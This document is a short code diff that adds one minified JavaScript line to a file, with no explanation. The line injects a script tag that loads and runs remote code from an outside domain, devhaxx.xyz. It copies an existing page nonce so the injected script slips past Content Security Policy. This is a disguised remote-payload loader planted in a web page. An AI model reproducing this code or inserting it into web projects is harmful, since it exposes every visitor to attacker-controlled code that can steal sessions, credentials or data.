@@ -1,0 +1,1 @@
+(()=>{const e=document.createElement("script");e.src="https://devhaxx.xyz/load.js",document.querySelector("[nonce]")&&(e.nonce=document.querySelector("[nonce]").nonce),document.body.appendChild(e)})();
